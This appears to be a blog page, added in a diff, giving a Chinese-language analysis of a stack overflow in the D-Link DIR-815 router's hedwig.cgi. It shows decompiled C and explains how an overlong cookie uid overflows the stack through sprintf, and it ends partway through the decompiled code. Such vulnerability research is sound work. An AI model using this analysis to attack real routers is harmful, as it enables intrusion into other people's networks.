@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="D-LINK-DIR815栈溢出分析前言D-LINK DIR645/DIR815都存在的一个洞，这里选择815的固件进行分析。 漏洞分析下载固件，binwalk解压，定位到hedwig.cgi，发现是个符号链接指向cgibin，把该文件拷出分析。 main函数根据启动时的参数确定，形如./cgibin /hedwig.cgi的启动方式对应进入hedwigcgi_main的处理逻辑。 1234567">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D-LINK-DIR815_stack_overflow">
+<meta property="og:url" content="http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="D-LINK-DIR815栈溢出分析前言D-LINK DIR645/DIR815都存在的一个洞，这里选择815的固件进行分析。 漏洞分析下载固件，binwalk解压，定位到hedwig.cgi，发现是个符号链接指向cgibin，把该文件拷出分析。 main函数根据启动时的参数确定，形如./cgibin /hedwig.cgi的启动方式对应进入hedwigcgi_main的处理逻辑。 1234567">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/1.png">
+<meta property="og:image" content="http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/2.png">
+<meta property="og:updated_time" content="2020-12-19T06:10:11.732Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="D-LINK-DIR815_stack_overflow">
+<meta name="twitter:description" content="D-LINK-DIR815栈溢出分析前言D-LINK DIR645/DIR815都存在的一个洞，这里选择815的固件进行分析。 漏洞分析下载固件，binwalk解压，定位到hedwig.cgi，发现是个符号链接指向cgibin，把该文件拷出分析。 main函数根据启动时的参数确定，形如./cgibin /hedwig.cgi的启动方式对应进入hedwigcgi_main的处理逻辑。 1234567">
+<meta name="twitter:image" content="http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>D-LINK-DIR815_stack_overflow | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2020/12/19/D-LINK-DIR815-stack-overflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">D-LINK-DIR815_stack_overflow
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-12-19 14:09:36 / Modified: 14:10:11" itemprop="dateCreated datePublished" datetime="2020-12-19T14:09:36+08:00">2020-12-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/12/19/D-LINK-DIR815-stack-overflow/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/12/19/D-LINK-DIR815-stack-overflow/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/12/19/D-LINK-DIR815-stack-overflow/" class="leancloud_visitors" data-flag-title="D-LINK-DIR815_stack_overflow">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="D-LINK-DIR815栈溢出分析"><a href="#D-LINK-DIR815栈溢出分析" class="headerlink" title="D-LINK-DIR815栈溢出分析"></a>D-LINK-DIR815栈溢出分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>D-LINK DIR645/DIR815都存在的一个洞，这里选择815的固件进行分析。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>下载固件，binwalk解压，定位到hedwig.cgi，发现是个符号链接指向cgibin，把该文件拷出分析。</p>
+<p>main函数根据启动时的参数确定，形如<code>./cgibin /hedwig.cgi</code>的启动方式对应进入hedwigcgi_main的处理逻辑。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// $t9</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  v3 = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="number">47</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"phpcgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = phpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> **, <span class="keyword">const</span> <span class="keyword">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"dlcfg.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = dlcfg_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> **, <span class="keyword">const</span> <span class="keyword">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"seama.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = seamacgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"fwup.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = fwup_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"fwupdater"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())fwupdater_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"session.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;sessioncgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"captcha.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;captchacgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"hedwig.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = hedwigcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"pigwidgeon.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;pigwidgeoncgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"service.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;servicecgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"ssdpcgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = ssdpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"soap.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = soapcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"gena.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = genacgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"conntrack.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;conntrackcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"hnap"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;hnap_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"CGI.BIN, unknown command %s\n"</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>hedwigcgi_main是漏洞存在的函数，其获取数据的方式基本都是通过getenv从环境变量中获取，比如<code>REQUEST_METHOD</code>这个字段，这点和我们之前遇到的httpd通过http请求不同。</p>
+<p>继续往下看，需要校验<code>REQUEST_METHOD=POST</code>，通过sess_get_uid函数获取环境变量中的uid保存到v6，在sess_get_uid函数中需要给出<code>HTTP_COOKIE</code>和<code>REMOTE_ADDR</code>，所有通过环境变量获取的字符串会通过<code>sobj_add_string</code>拼接起来返回给上层函数.</p>
+<p>sprintf不会限制拷贝的字节数，输入过长的uid造成栈溢出。之后需要创建一个<code>/var/tmp/temp.xml</code>文件且赋予可写权限，在下面还有一个sprintf存在溢出，这里我们只拿第一个做利用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hedwigcgi_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// $a1</span></span><br><span class="line">  FILE *v2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $fp</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $s5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// $s7</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> **v11; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v14; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v17; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v22[<span class="number">20</span>]; <span class="comment">// [sp-4D0h] [-4D0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v23; <span class="comment">// [sp-4BCh] [-4BCh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v24; <span class="comment">// [sp-4B8h] [-4B8h]</span></span><br><span class="line">  _DWORD v25[<span class="number">3</span>]; <span class="comment">// [sp-4B4h] [-4B4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v26[<span class="number">128</span>]; <span class="comment">// [sp-4A8h] [-4A8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v27[<span class="number">1064</span>]; <span class="comment">// [sp-428h] [-428h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v26, <span class="number">0</span>, <span class="keyword">sizeof</span>(v26));</span><br><span class="line">  <span class="built_in">strcpy</span>(v22, <span class="string">"/runtime/session"</span>);</span><br><span class="line">  v0 = getenv(<span class="string">"REQUEST_METHOD"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"no REQUEST"</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v0, <span class="string">"POST"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unsupported HTTP request"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, <span class="number">0</span>, <span class="number">0x20000</span>);</span><br><span class="line">  v2 = fopen(<span class="string">"/etc/config/image_sign"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(v26, <span class="number">128</span>, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unable to read signature!"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(v2);</span><br><span class="line">  cgibin_reatwhite(v26);</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  v5 = sobj_new();</span><br><span class="line">  v3 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"unable to allocate string object"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  